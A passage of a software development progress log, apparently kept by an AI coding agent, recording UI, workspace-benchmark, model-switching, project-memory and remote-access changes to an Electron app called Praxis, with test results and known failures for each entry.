Full unit/Electron suite: 128/132 passed. Mobile-frame and measure-alt pass on
separate reruns; chat-render and provider-skills-menu match documented failures.

## 2026-09-11 — Startup crossfade

Added a 500ms eased crossfade after the four-second cat reveal. The completed
cat stays sharp while its layer fades out and the mounted app fades in beneath
it, without remounting the app at the end. StartupVisibility holds native preview
bounds at zero until the crossfade finishes so the native surface cannot cover
the transition; browser previews inherit the shell opacity. Reduced motion skips
the reveal and crossfade, including when enabled mid-transition.

Type checks and the extended startup Electron test pass. It asserts overlapping
intermediate opacities, retained final cat pixels, cleanup, reload behavior, and
reduced motion. Inspected the crossfade screenshot.
Full suite: 129/132 initially passed. The native drag test sent input before the
crossfade finished; it now waits for the intro to leave, and its rerun passes.
The two remaining failures are the previously documented chat-render sidebar
timeout and provider-skills-menu switch assertion.
## 2026-09-11 — Shadcn composer dropdowns

Migrated provider, model, and permission pickers from native selects to the shared
shadcn dropdown component. Compact trigger labels remain; menus show full labels,
checkmarks, and a separate Add new action. Shared menu surfaces use softer corners
and shadow. Branch, publish, and project menus already used this component.
Motion spring animation remains the next step requested by the user.

Composer menus wait for the native preview snapshot before opening. Nonmodal
menus release focus/pointer handling during provider changes, and disabling the
trigger cancels its pending open state. Updated existing picker tests to interact
with menus and extended coverage for keyboard opening, Escape/focus restoration,
selection, outside dismissal, and the Settings action. Inspected menu screenshots.

Type checks and the focused menu regression pass. Full unit/Electron suite:
131/132 passed; only the previously documented chat-render sidebar timeout remains.

## 2026-09-11 — Supplied icon artwork and state transitions

Replaced all 35 renderer Lucide imports with the user's SVG artwork. Original
exports live in assets/icons; scripts/generate-icons.py creates theme-inheriting
path data and equivalent cubic endpoints for the supplied folder/sidebar states.
A shared React component preserves sizing and accessibility props. CSS morphs
the same mounted paths on expansion/collapse; reduced motion switches instantly.
Folders remain visible on hover so the motion is not covered by the chevron;
project favicons retain their existing hover treatment.

Type checks and the extended rail-collapse Electron test pass. Coverage checks
both directions, mounted-node continuity, real CSS transitions, hover visibility,
and reduced motion. Inspected the open-folder and sidebar screenshots.
Full unit/Electron suite: 130/132 passed, with the previously documented
chat-render sidebar timeout and provider-skills-menu switch assertion.

## 2026-09-11 — Centered pixel-cat startup intro

Ported the supplied HTML's 60-square cat and single-layer SVG threshold reveal
into StartupCat/StartupIntro. Preserved the 4-second duration, 16px blur, 24%
stagger, and 250ms lead-in. The cat is centered on the reference's off-white
background without demo controls; the main app mounts when it finishes. Editor
and inspector windows bypass the intro, and reduced motion skips it. Existing
native preview bounds are zeroed during renderer reload so they cannot cover it.

Type checks and the new Electron startup test pass: centered geometry, all 60
pixels, intermediate/final screenshots, app handoff, animation cleanup, native
preview suppression on reload, and reduced-motion changes. Inspected both PNGs.
Full unit/Electron suite: 130/132 passed; only the previously documented
chat-render sidebar timeout and provider-skills-menu switch failure remain.

## 2026-09-11 — Resize the live viewport during divider dragging

Replaced the divider's stretched freeze-frame with pointer capture. The native
preview remains visible and receives its changing bounds throughout the gesture,
so text reflows and media queries respond before release. Extracted the gesture
into usePreviewResize, with pointer cancellation, lost-capture, lost-focus, and
unmount cleanup. Freeze-frame behavior remains for menus and dialogs.

Type checks and the extended viewport Electron test pass. It verifies native
visibility, no snapshot, responsive one/two-column reflow in both drag directions,
unchanged font size, and lost-focus cancellation. Inspected the native screenshot
taken while the drag was held. An additional macOS computer-use check could not
run because the Mac was locked; no OS-level drag result is claimed.
Full unit/Electron suite: 129/131 passed, with the previously documented
chat-render sidebar timeout and provider-skills-menu switch failure.

## 2026-09-11 — Live preview dimensions

Added a Chrome-style width × height badge at the preview's top-right corner.
The native page measures its CSS viewport; the renderer shares the readout for
divider-drag snapshots and browser previews. It updates on size changes and hides
after one second of inactivity. Snapshot capture excludes the old badge so it
cannot stretch underneath the current dimensions. A separate overlay identifier
preserves the inspector's existing DOM contract.

Type checks and the extended viewport Electron test pass, covering native window
resizing, actual viewport dimensions, divider dragging, and automatic dismissal.
Inspected native and drag screenshots; badge text passes the APCA contrast check.
Selection, spacing measurement, and comment tests pass after correcting an overlay
identifier collision exposed by the full suite.
Full suite initially passed 126/131; the three overlay failures are fixed and
their focused reruns pass. The remaining chat-render and provider-skills-menu
failures match the previously recorded sidebar and provider-switch failures.

## 2026-09-11 — Scrollable project memory

Disabled content-driven textarea sizing in the memory dialog, bounded the dialog
to the viewport, and let the editor shrink and scroll internally. The header,
status, Save, and Close remain accessible with long memories and smaller windows.

Type checks pass. Extended the existing Electron test with a 15k-character memory,
wheel scrolling, keyboard navigation to the end, and visible controls at two
window sizes; the focused test passes and both screenshots were inspected.
The full suite ran 128/131: the memory test initially exposed a test-caret reset
issue, fixed and verified in the focused rerun; chat-render and provider-skills-menu
retain their previously recorded failures.

## 2026-09-11 — Subagent cats stand on the border

Bottom-aligned the subagent group and the sprites inside its buttons so the
small cats' feet share the big cat's border instead of floating above it.
Type checks and the rail-chat-status bottom-edge assertion pass; inspected the
updated screenshot. Full suite: 129/131 passed, with the previously documented
chat-render sidebar timeout and provider-skills-menu switch timing failure.

## 2026-09-10 — Subagent cats beside the composer

Replaced nested background-agent sidebar rows with up to six smaller copies of
the main cat on the right of the composer status line. Cats follow the active
chat, animate for running work, and idle while queued; running work takes
priority when more than six operations exist. Hover and keyboard focus show the
operation label and queued state. Clicking retains the existing cancel action.

Type checks and the extended rail-chat-status Electron test pass. Inspected the
six-cat screenshot and operation tooltip; coverage also checks chat scoping,
the display limit, smaller size, queued state, and disappearance on completion.
Full unit/Electron suite: 129/131 passed, with the previously recorded chat-render
sidebar timeout (line 495) and provider-skills-menu model-switch timing failure.

## 2026-09-10 — Text-sized composer selectors

Provider, model, and permission controls now size to the selected label instead
of fixed flex allocations. A shared ComposerSelect displays the first 10
characters plus `...` for longer labels and can shrink further in narrow panes.
Native menus retain full option names, keyboard behavior, and accessible labels;
hover titles include the complete selection.

Type checks and a focused Electron selector check pass; inspected short-label
and narrow long-label screenshots. Updated chat-render's overflow check to use
real provider data and assert text-sized controls. Full suite: 129/131 passed;
provider-skills-menu retains its recorded switch timing failure, and chat-render
times out at its unrelated two-chat sidebar assertion (line 495), before the
selector checks. The isolated selector check passed those layout assertions.

## 2026-09-10 — File badges on sent messages

Sent messages now retain file attachment metadata and display a file icon plus
filename beside image thumbnails, with the absolute path available on hover.
Badges remain visible when the message includes text; file-only sends use the
badge instead of a fallback filename in the message body. Existing image records
remain compatible. Extracted attachment rendering into MessageAttachments.

Extended chat-render coverage through the real file-drop/send flow with stubbed
agent transport, plus mixed file/image display. Inspected the attachment PNG.
Type checks pass; full unit/Electron suite passes 130/131, with the previously
recorded provider-skills-menu timing assertion (Claude observed before Codex).

## 2026-09-10 — Expanded preview traffic-light clearance

The expanded preview header now reserves an 86px left inset in native macOS
windows so its branch and URL stay clear of the traffic lights. Fullscreen,
browser mode, and the ordinary split layout retain their existing padding.
Extended chat-hide coverage to check branch clearance and fullscreen
state notifications. Type checks and the corrected targeted test pass; inspected
the expanded-header screenshot. Full suite: 129/131 initially passed, with a native
fullscreen animation timeout in chat-hide (replaced by deterministic notification
coverage, passing on rerun) and the existing provider-skills timing failure.

## 2026-09-09 — Sidebar toggle traffic-light spacing

Added 8px to the sidebar toggle's normal left inset (78px → 86px).
The fullscreen override remains 12px when the traffic lights are absent.
Type checks and sidebar-collapse coverage pass; inspected the updated screenshot.
Full suite: 130/131 passed, with the existing provider-skills model-switch timing
assertion still failing.

## 2026-09-09 — Recurring snapshot/index investigation

Profiled captureBase and compared fresh indexes, retained private indexes, clean
HEAD reuse and repeated snapshot reuse. Five-sample warm clean medians were
93 → 50 ms for Praxis, 412 → 59 ms with 5,000 added files, and 195 → 48 ms with
64 MiB of unchanged assets. Most savings come from git add avoiding repeated
hashing (322 → 18 ms on the many-file fixture), not skipping commit creation.

Thirteen production-oracle comparisons passed with the real index byte-preserved,
including WIP, external edits, ignore changes and recovery. Separate probes exposed
three cache hazards: keeping formerly untracked files after ignore changes,
skipping normalization after attribute changes, and missing restored-mtime edits
with ctime checks disabled. Fresh rebuilding corrected each mismatch. Documented
invalidation, cache-boundary locking, stat settings and GC requirements; recommend
guarded metadata reuse before CoW, with fresh-index fallback. Production is unchanged.
Reproducible scripts, raw samples and analysis live in SNAPSHOT-INVESTIGATION.md.

TypeScript checks passed; full unit/Electron suite passed 130/131. The same existing
provider-skills-menu assertion observed Claude immediately after selecting Codex.
All workspace regressions passed. Inspected the chat-render PNG.

## 2026-09-09 — Sidebar toggle alignment

Moved the floating sidebar toggle up one CSS pixel (top: 9px → 8px), as requested
for its alignment beside the macOS traffic lights. Type checks and the sidebar
collapse test pass; inspected its screenshot. Full suite: 129/131 passed. The
provider-skills test observed Claude before its Codex switch completed; the
spawn-comment test reported success but hung during cleanup and was terminated.

## 2026-09-09 — Copy-on-write workspace investigation

Benchmarked actual chat worktree creation and turn-start syncing against a native
APFS CoW hybrid in disposable repositories, with five alternating-order samples
for Praxis source, 5,000 additional small files, and 64 MiB of random assets.
Median creation fell from 214 to 196 ms, 1,193 to 917 ms, and 370 to 304 ms, before
production clone validation/fallback costs. The small-source result is noisy.
Raw source-copy timings omit Git semantics and are not equivalent workspaces.

Retain the current implementation: the experiment does not establish a simpler
replacement for Git-based landing/recovery. Recurring captureBase work measured
118–447 ms and is a better next profiling target. The native forced-clone helper
also exposed a runtime distinction: Node v26.7.0's force-reflink call returned
ENOSYS here while native cloning worked. Per-file cloning requires protection
against live changes between Git capture and copying. Recorded methodology,
samples, correctness checks, limitations and follow-up in COW-INVESTIGATION.md.

All benchmark content/WIP/private-write/sync/staged-state checks and TypeScript
checks pass. The initial sandboxed suite could not bind sockets or launch Electron;
the unrestricted rerun passed 130/131. The existing provider-skills-menu assertion
still observed Claude immediately after selecting Codex, and repeated in a fresh
isolated rerun. All workspace regressions passed; the optional live comment probe
skipped without an applied provider edit. Inspected the chat-render PNG. No
production behavior changed.

## 2026-09-09 — Model-switch history handoff and token confirmation

The picker previously copied only the display/persistence record on Codex/provider
restarts, leaving the new model unaware of earlier turns. Every picker change now
starts a fresh session for that chat and injects recorded user/assistant text and
tool summaries on its next message once. The wrapper keeps the replay out of the
saved transcript, preserves current-turn attachments, and avoids carrying a stale
provider SDK id. Restart creation failures retain the existing session.

A preview-safe confirmation dialog explains extra input tokens and possible
cost/allowance usage before nonempty chats change models. Cancel leaves the choice
alone, empty chats switch directly, and switches are blocked during responses.
The composer waits for restart completion; failures appear in an alert.

Unit checks cover replay ordering/content, no transcript mutation, one-time use,
empty chats, attachments, and synchronous send failure. Electron coverage verifies
token disclosure, Cancel, approval, and per-chat model settings; inspected its PNG.
A live Codex restart recalled a random reference existing only in the prior chat.
TypeScript, targeted lint, and the final rebuilt chat UI regression pass, including
failed-start retention. Full verification passed 137/138 (simulator skipped without
Xcode); the unrelated live tool-invocation probe missed line_height. Its isolated
rerun also missed the requested tools. The new live history-recall test passed in
both its targeted run and full verification.

## 2026-09-09 — Escape disarms selection from the inspector

Escape now reaches the selection toggle from the separate floating inspector
renderer. The main renderer listens during capture so focused controls cannot
swallow selection cancellation. Cancelling inline preview text editing restores
the original text and disarms selection in the same keypress.

Extended the selection Electron regression to cover inline-edit cancellation,
inspector Escape, and S followed by Escape from the composer. Targeted regression
and TypeScript checks pass. The full suite passed 129/130; the style test relied
on Escape retaining selection. Updated it to assert disarming and reselect, then
its isolated rerun passed. All 130 checks now pass across those runs.

## 2026-09-09 — Automatic visual-edit subagents, including Codex

Committed visual edits that require AI now start a detached child immediately:
props, styles, custom controls, layer-panel moves, and preview sibling gestures
join the existing inline-text path. Inspector actions carry the project root;
shared dispatch retains that project's parent settings and leaves drafts and
transcripts untouched. Vague Ask-agent affordances still seed an instruction so
the user can specify the change. Literal/source-resolvable edits still write
immediately. Unsupported providers/non-Git workspaces retain an explained composer
fallback; Git-backed successful children auto-land through the existing path.

Codex and custom endpoints now advertise background support and stamp every child
event with its session id. A child cannot invoke the parent chat's workspace
resolution tools. Failed or cancelled children never auto-apply partial edits;
terminal outcomes distinguish failure, cancellation, no-change, review, and apply.
Fast startup failures cannot leave a ghost running row when completion beats the
spawn IPC response. Automatic edit completion stays in the activity log.

Added an Electron regression that sends the inspector's committed-edit action,
checks actual Codex dispatch and failure cleanup, and preserves draft/transcript.
An opt-in live mode verifies Codex writes reach the live preview and that a child
cancelled after a private source edit retains recovery work without changing live.

All TypeScript projects and targeted lint pass. Full verification finished
135/136; the chat slash-menu UI test failed during overlapping Electron runs,
then passed on an isolated rerun. Rebuilt the final custom-control fallbacks and
reran chat rendering, custom controls, and visual-edit dispatch sequentially; all
passed. Real Codex auto-apply and cancellation checks passed. The simulator live
test skipped because Xcode is unavailable.

## 2026-09-09 — Chat title marquee around revealed actions

Chat rows now reserve the measured button layout width (one or two actions plus
spacing) when hovered or keyboard-focused. The former 24px title padding allowed
the pencil and close button to overlap text. Trailing metadata yields its space
while the actions are visible, and titles regain their full width on exit.

`RailChatTitle` measures the remaining viewport with ResizeObserver and animates
only overflowing names: a 700ms pause, a 30px/second reveal to the final character,
then a hold at the end. Leaving the row resets it; changed names remount the title
so old measurements/animation state cannot leak. Reduced motion keeps a static
ellipsis, with the existing complete title tooltip available. Short titles stay
still. The shared row covers live chats, history, and background agents.

Extended the rail-status Electron regression to verify non-overlap, actual title
motion, the final character's alignment, reset on exit, keyboard focus, and
reduced motion. Inspected the marquee-end and reduced-motion screenshots.
All three TypeScript projects, targeted lint, and all 129 unit/Electron tests pass.

## 2026-09-09 — Scroll-aware chat fade with a crisp pinned request

Replaced the chat pane's always-on backdrop-blur overlay with shadcn's
`scroll-fade-t` utility on the actual conversation scroller. The fade reveals
with scrolling and disappears at the start. Its 40px depth ends before the
pinned request's 44px sticky inset, keeping that bubble sharp while the reply
scrolls behind it. An additive gutter mask preserves the visible native
scrollbar; the existing bottom status treatment is unchanged.

Imported the shared `shadcn/tailwind.css` utilities and kept the gutter adaptation
in `chat-scroll.css`. Electron visual verification measured a 40px fade and 44px
pinned inset, confirmed no backdrop blur, checked the unmasked 12px scrollbar
strip, and verified the top fade returns to zero at scroll start. Inspected the
scrolled, top-of-history, pinned-message handoff, and dark-mode screenshots.
All three TypeScript projects, the build, and all 129 unit/Electron tests pass.

## 2026-09-09 — Codex runtime compatibility and skills across providers

Upgraded the bundled Codex SDK/CLI from 0.146.0 to 0.154.0. Praxis launches the
SDK's vendored CLI, so updating a global Codex installation did not address the
reported GPT-6 Astra version rejection. A live read-only `gpt-6-astra` request
through the upgraded binary returned the expected marker successfully.

Only Claude previously emitted the composer's skills list. Codex, custom
endpoints, and experimental Gemini now share eager project/user discovery from
`.agents`, their native skills directory, and `.claude` for existing installed
packs. Project skills shadow user skills; symlinked installs, system skills,
and CODEX_HOME are supported. Isolated chats discover from the live project root.
Invoking `/name` passes an explicit SKILL.md reference so non-Claude harnesses
can read and use the selected skill. Claude retains SDK command discovery.

Regression coverage checks discovery, precedence, linked/broken installs,
invocation references, isolated roots, and eager session emission. The Electron
regression switches the actual provider dropdown to Codex, opens the menu before
any turn with the CLI deliberately absent, and verifies insertion. Inspected its
screenshot, including the Codex selection and skill description.

All three TypeScript projects pass. Full `bun run verify` finished 135/135 with
no failures (the live simulator test skipped because Xcode is unavailable).
Rebuilt the final live-root discovery adjustment and reran the Codex menu test;
targeted discovery/invocation regressions and lint also pass.

## 2026-09-04 — Modifier-drag siblings in the native preview

Select any stamped element, then Command-drag (Control on Windows/Linux) to
reorder it among its current parent's children. Nested text/icons keep the
selected object as the drag source. Tag-independent edge geometry handles
columns, rows, grids, and reversed flow, with a five-pixel start threshold,
insertion line, and six-pixel target tolerance. This first version never reparents.

The preview sends only trusted gestures through a sender-checked relay to the
existing Layers source mover. React/Svelte/HTML edits retain edit-history undo;
ambiguous template/data moves seed the composer. Escape, modifier release,
leaving the parent, blur, scrolling, and structural changes cancel safely, and
cancelled gestures suppress the page click. Browser gesture parity remains open.

Verified all TypeScript projects and the full unit/Electron suite (127/127).
The new geometry regression covers rows, columns, grids, reverse flow, and no-ops.
The native-preview regression uses non-list cards with nested content and checks
source persistence, live reload, exact undo, horizontal dragging, cancellation,
outside-parent drops, ordinary input, and synthetic-event rejection. Inspected
the captured native preview insertion line. The renderer subscription lives in
its own hook, independently of whether the Layers panel is open.

## 2026-09-04 — Visible chat/preview separator

The existing resize divider now paints a full-height 1px line with the shared
border-prominent token. Its widened drag target stays intact, and Hide UI still
unmounts it. Preview padding and square corners remain unchanged. Verified all
TypeScript projects, all 125 unit/Electron tests, and the preview screenshot.

## 2026-09-04 — Compact chat lists and flush preview

Removed the per-project Chats heading and model labels from live chat and
background-agent rows. Titles retain hover/focus room for rename/close actions.
Desktop previews now fill the pane without outer padding, card borders, or CSS
and native corner rounding; the mobile device frame retains its screen shape.
The chat's top and bottom fades stop before a shared 12px scrollbar gutter, so
the thumb remains visible and reachable through the fade area.

Verified all TypeScript projects and the full unit/Electron suite (125/125).
Inspected the preview, chat, and rail hover screenshots; a separate overflowing
conversation check measured a 12px uncovered gutter and confirmed the thumb's
bottom edge remains fully visible. The initial sandboxed test attempt could not
start local services/Electron; the authorized unsandboxed run passed completely.

## 2026-09-04 — Rail-status failure diagnosed and repaired

The repeatedly reported missing-row crash had two test defects. Its immediate
cause was positional selection: after newest-first ordering, the working chat's
nested agent list occupies the second DOM child, so `.rail__chat-item:nth-child(2)`
matches nothing even while all three chats are present. The hover check now targets
Finished chat by identity and uses Playwright's locator hover.

After correcting that selector, the real initialization race became visible:
openProject mounts the rail before awaiting annotations, then writes its final
single-session workspace snapshot, overwriting the test's synthetic chats. The test
now starts in a disposable profile and waits for the completed workspace entry's
URL before seeding. Status, alignment, hover, review-clearing, and rename assertions
remain intact. This corrects the earlier logs' incomplete timing-only diagnosis.
Verified with three consecutive focused passes, inspected hover pixels, all
TypeScript projects, and the complete suite: 125/125 passed, zero failures.

## 2026-09-04 — Project headers browse without switching chats

Project-name clicks now share the chevron's exclusive expand/collapse action.
Clicking the unfolded project closes its list; clicking another opens that list
and folds the others, preserving the active conversation and native preview.
Direct chat clicks still activate the selected chat and its project. Removed the
unused Rail switching callback and exposed expanded state on both header buttons.

The rail regression exercises active and inactive header toggles, checks that the
current conversation and preview survive browsing, and then verifies direct chat
switching. The viewport regression now switches through chat rows too. Verified
TypeScript, both interaction flows, and the captured rail layout. The full suite
finished at 124/125; only the previously documented rail-chat-status missing-row
geometry assertion failed.

## 2026-09-04 — Hover actions in project headers

Moved New chat from below the chat list to a compose icon at the right of each
project header. An ellipsis immediately to its left opens the existing shadcn menu
with Memory and Remove project; removal preserves the existing close-project
behavior. The header reveals both controls on hover or keyboard focus, the menu
trigger remains visible while open, and touch devices retain visible controls.
Extracted the controls into RailProjectActions and removed their legacy CSS.

The rail regression checks hidden/resting and hover/focus states, right-side ordering,
and menu entries, with a captured menu inspected visually. Updated Memory's editor
round-trip and New chat's existing interaction tests to use the new header controls,
and removed the obsolete list-row alignment expectation. All TypeScript projects
and the focused rail and Memory flows pass. The full suite finished at 124/125;
only the previously documented rail-chat-status missing-row geometry assertion
failed, while the changed rail, Memory, and chat-render flows passed.

## 2026-09-04 — Measurement values join the red geometry

Replaced the measurement value badges' hard-coded black fill with the shared
`#f24822` measurement color, so labels, spans, and end caps read as one overlay.
White numerals remain the more legible text choice on this red (APCA Lc 68.4,
versus 40.5 for near-black). The real Option-hover regression now reads computed
styles from the preview overlay and requires every value and geometry fill to match.
Verified all TypeScript projects, the pure geometry test, the real preview gesture,
and its captured pixels. The standard matrix finished at 121/122: the changed
measurement path passed, with only the already-documented `rail-chat-status`
state-seeding race failing at its unchanged missing-row geometry assertion.

## 2026-09-04 — Option-hover spacing measurement
## 2026-09-04 — Selection titles drop compiler style-scope classes

The Layers fix in PR #223 only filtered `buildLayersSnapshot`; the preview's blue
hover/selection badge and the `SelectedElement` IPC payload still read raw
`className`, so the same `s-p0FWuf5vgUnM`-style suffixes leaked into selection
titles, Inspector/composer state, chat snapshots, and prompt context.

The scope-class predicate now lives in `src/shared/display-classes.ts` and is used by
both Layers and native preview selection. Filtering happens before the existing
display caps, while CSS selector construction keeps raw classes so targeting is not
weakened. The browser preview bridge serializes that same shared pattern into its
in-page selection payload, keeping native and browser behavior aligned.

The selectable fixture now gives its heading a generated scope marker followed by an
authored class. `test/select-element.mjs` proves the renderer payload contains only
the authored class and the real native preview badge renders only that class. Verified
with the scope-filter unit test, all three TypeScript projects, the focused Electron
selection test, browser-mode integration, visual inspection of the native preview
capture, and the complete `bun run test` suite (123/123).

## 2026-09-04 — Option-hover spacing measurement restored to main

The completed measurement work had remained only on `agent/lkm-78` in conflicted
PR #224, so released builds contained the selected-element size chip but none of the
Option-hover measurement module or event wiring. The branch is now integrated into
main with both test registries resolved as unions, retaining every newer main test.

Select an element in the preview, then hold Option/Alt and hover another: the overlay
draws Figma-style red distance spans and pixel labels. Separated boxes get the facing
edge gap on each separated axis (with dashed extension guides for diagonal geometry);
nested or intersecting boxes get matched-edge deltas, which exposes container insets.
The pure geometry lives in `src/preview/measure.ts`; `preload.ts` owns the fixed overlay
and clears it on Option-up, blur, scroll, mouse-out, and selection teardown.

`test/measure-distance.mjs` covers gaps, diagonals, guides, containment insets, flush
edges, and sub-pixel noise. `test/measure-alt.mjs` drives the real preview gesture,
compares its label to live DOM geometry, verifies cleanup, and captures the native
preview overlay for visual inspection. The value badge uses 12px/700 white text on
`#111` (APCA Lc -107.4, pass) while the measurement geometry keeps the Figma-red
accent. Verified with `bun run typecheck`, both focused tests, visual inspection of
the native preview capture, and the complete `bun run test` suite (123/123).

## 2026-09-04 — Remote status recedes into the preview toolbar

Replaced the heavy bordered “Remote access active” pill with a single small connection
dot. The full status remains available to screen readers and through its Tailscale-only
tooltip, but no longer competes with the URL, preview actions, or primary Publish
button. A contrast review rejected low-contrast 11px microcopy in both themes; the
text-free indicator avoids that readability regression. Styling now lives with the
component's Tailwind utilities, and the touched legacy CSS block was removed. A
focused Electron regression verifies the 20px transparent status slot, 6px dot,
absence of pill chrome, accessible name/tooltip, and captured toolbar appearance.
Verified all TypeScript projects, the browser-mode integration, and the focused visual
test. The standard matrix finished at 119/120; the new path passed, with only the
already-documented `rail-chat-status` state-seeding race failing at its unchanged
missing-row geometry assertion.

## 2026-09-04 — Composer pickers truncate instead of wrapping

Kept the provider, model, and permission pickers on one line in narrow chat panes.
Each native picker now has a bounded flex width and ellipsis behavior, allowing long
connection/model labels to shrink before they can wrap the toolbar or push the send
button out of view. The chat-render regression now checks the one-line geometry,
width caps, truncation styles, and send-button visibility at a 320px pane width;
its forced long labels visibly render as `A very…` and `GPT-5.6-…`.

Verified all TypeScript projects and the focused Electron chat-render flow. The
standard matrix finished at 117/119: this path passed, `spawn-comment` passed on its
focused rerun, and the already-documented `rail-chat-status` state-seeding race still
fails at its missing-row geometry assertion.

## 2026-09-04 — Browser Add Tokens reaches the shared token service

Fixed the remote/local-browser token offer appearing inert. The browser adapter
already sent `tokens:scaffold`, but the browser command router had never registered
that handler; it rejected the RPC as unsupported, and the retry-friendly offer card
kept the failure quiet. Token detection was also a hard-coded empty result, so browser
mode could offer a starter palette even when the project already exposed tokens.

`registerTokensIpc` now accepts the same narrow handler registry used by Electron,
allowing browser mode to reuse the existing detector and safe, idempotent scaffolder.
Both commands are repository-root scoped, and the browser adapter now performs real
detection. Browser integration runs against a disposable copy of the fixture and
covers empty detection, out-of-root rejection, manifest creation, returned token data,
and a no-write second call.

Verified full typecheck, the focused Electron Add Tokens UI test, and the focused
browser transport test. The standard matrix finished at 118/119: all token/browser
coverage passed, while the already-documented unrelated `rail-chat-status` state-
seeding race failed again at its missing-row geometry assertion.

## 2026-09-04 — Chats now maintain unified project memory

Every successful interactive chat turn now triggers a separate, tool-free model
evaluation that merges only durable project decisions into the project's shared
memory. The evaluator keeps accepted architecture/product choices, stable user
preferences and constraints, naming/workflow conventions, and important long-lived
requirements; it rejects transient progress, repository-discoverable details,
unaccepted suggestions, errors, secrets, credentials, and personal data. It returns
the complete memory or an explicit no-change result, and malformed/failed evaluations
are safe no-ops. Claude and Codex/connection chats support the path; experimental
Gemini remains unchanged.

Automatic writes are serialized per project so simultaneous peer chats merge against
the latest value instead of racing. An optimistic revision check also detects a manual
memory-editor save during evaluation and retries once against that authoritative edit.
The editor now explains the automatic behavior and remains the user's direct review
and override surface. Existing live chats receive learned revisions through the
already-established one-time next-turn injection.

Added pure coverage for bounded recent-chat digests, the strict JSON/no-change
protocol, malformed and empty-output safety, peer-chat serialization, and concurrent
manual-edit protection. Verified both focused memory tests, all TypeScript projects,
the production Electron build, the project-memory UI flow and screenshot, and the full
standard matrix at 118/119. The only failure was the unrelated `rail-chat-status` UI
test's existing state-seeding race (a queried chat row disappeared after the test's
initial assertion); a focused rerun reproduced it without involving this path.

## 2026-09-04 — Chats are peers; Main/secondary hierarchy removed

Removed the special Main role from the product model. Every live chat now renders
newest-first under its generated or user-edited title and exposes the same rename
and close actions. The first-created session keeps the plain project key as an
internal transport identity only; it no longer receives a pinned label, protected
close behavior, or special empty-chat handling. Background agents still nest under
the exact peer chat that launched them.

Project memory is now only shared durable context; its Main-only reset panel and IPC
were removed. Starting a peer chat is the single way to get a fresh model context.
When a project's sessions stop, the last-active peer becomes its relaunch
continuation and the other stopped peers enter History. Persistence now writes
`slot: 'current'`, while accepting legacy `slot: 'main'` records and replacing them
on the next save. Reopening also collapses stale renderer session keys onto the one
restored continuation and carries over that chat's model settings.

Updated the rail, persistence, memory, and model-switching regressions plus the user
documentation. Verified the production build, all three TypeScript projects,
changed test-file syntax, session-store/chat-settings/preferred-model/docs-link unit
tests, and the full unit tier at 58/60. Its two failures were sandbox restrictions on
binding a loopback port and Unix socket; all other unit tests passed. Focused Electron
UI launch was unavailable because the host rejected GUI execution after reaching its
execution-usage limit, so those updated flows remain to be rerun when it resets.
## 2026-09-04 — Candidate integrated into main

Merged the seven candidate-only commits with the seven main-only commits. The one
textual conflict was the roadmap: both branches had added independent shipped and
in-progress sections at the same insertion point. The resolution keeps both sets and
orders the new entries newest-first; the automatically merged progress log received
the same chronological repair. No implementation side was discarded. Verified all
three TypeScript projects, the candidate-focused unit tests, and the complete standard
suite (121/121). The rail accordion, color swatches, and scope-class-free Layers UI
artifacts were visually inspected after the merge.

## 2026-09-04 — Layers rows drop compiler style-scope classes

Every row in a scoped-CSS project carried the compiler's own scoping class
(`s-p0FWuf5vgUnM`, `svelte-a43zbs`, `sc-bdVaJa`, …). It's identical on every
element a scoped stylesheet touches, so it added a long meaningless suffix to
each label and drowned the class that actually identifies the element.

`buildLayersSnapshot` now filters them out via a new pure `isScopeClass`
predicate in `src/preview/layers.ts`. Two deliberate choices: the filter runs
BEFORE the existing 5-class cap (otherwise a row whose first five classes are
scope markers would show nothing), and it's a prefix ALLOWLIST plus a
hash-shaped-tail check rather than a "looks random" heuristic — nothing
reliably separates a short hash from a real class name, so `s-active` and
`css-grid` stay on the row while `s-p0FWuf5vgUnM` goes. `LayerNode.classes` was
already label material (capped, lossy), so filtering at capture rather than in
`LayersTree` costs no other consumer; `api.ts` says so now.

`test/layers-labels.mjs` (new, unit) covers both directions of the predicate;
the `layers-app` fixture's mapped `<li>`s gained a scope class so
`test/layers-panel.mjs` fails if one ever leaks into a label again. Verified
with `bun run typecheck` and the complete `bun run test` suite (119/119).

## 2026-09-04 — The rail's project list is an accordion again (one open at a time)

User-reported: switching projects should hand the open chat list over — the one
you leave closes as the one you pick opens. Since 2026-08-07 the fold was fully
independent per project (that change fixed the opposite bug: `expanded` used to
mean "is the active project", so a fold reset on every switch). Independent folds
meant every project you visited stayed unfolded, and the rail grew a stack of
open chat lists you had to close by hand.

`store.ts` now has one helper, `foldOthers(projects, key)` — unfold `key`, fold
everything else — applied at the three places a list opens: `activate`,
`openOrActivate`, and the chevron's `toggleChatsCollapsed`. The chevron unfolds
exclusively too, so "at most one open" holds however you got there; folding the
open one just closes it (nothing springs open in its place). `chatsCollapsed`
stays real persisted per-project state, so a relaunch restores the same single
open project, and folding still never deactivates anything — the dev server and
preview of every open project stay live.

The list also animates open now, or the swap would happen in one frame:
`.rail__project-body` runs a `rail-unfold` keyframe from `height: 0` to
`height: auto`, which needs `interpolate-size: allow-keywords` (set on
`.rail__item`) since the list's real height depends on how many chats it has.
Verified by sampling the element per frame in Electron 43: 5 → 25 → 47 → 65 →
78 → 86 → 87px, then the animation ends. Reduced-motion drops it.

`src/renderer/src/store.ts`, `src/renderer/src/components/Rail.tsx` (comments),
`src/renderer/src/styles.css`, `test/rail.mjs` — which flips its old
"B's chats stay listed after switching away" assertion into the accordion ones
(switch folds the outgoing project, the chevron unfolds exclusively, folding
reopens nothing). Verified: `bun run typecheck`, plus `rail`, `rail-collapse`,
`rail-favicon`, `rail-chat-overflow`, `rail-chat-status`, `viewport-per-project`
and `restore-reload` on the Electron tier.

## 2026-09-04 — Secure remote-browser access through Tailscale Serve

Added `praxis serve <repo> --remote`, the first usable mode 2 slice. Praxis keeps
the control server and untrusted preview gateway on distinct IPv4-loopback ports,
then configures two tailnet-only Tailscale Serve HTTPS routes. The browser receives
the public origins while upstream dev servers remain private; the session cookie is
`Secure`, RPC and WebSocket requests retain exact Host/Origin enforcement, and the
single-use launch URL pairs one browser profile for the process lifetime. Remote mode
does not auto-open locally, avoiding accidental consumption of that pairing URL.

The CLI validates local and remote ports, requires a connected MagicDNS Tailscale
node, reports the one-time Serve activation URL when the feature is disabled, refuses
to replace existing Serve ports, and removes only the routes it created on graceful
shutdown. The UI displays a readable “Remote access active” pill. WebSocket events
now carry monotonic sequence numbers and the browser reconnects with its last cursor;
the server retains a bounded replay window for events missed during sleep or a network
transition.

Expanded CLI and browser-mode coverage for Tailscale status/spec generation, public
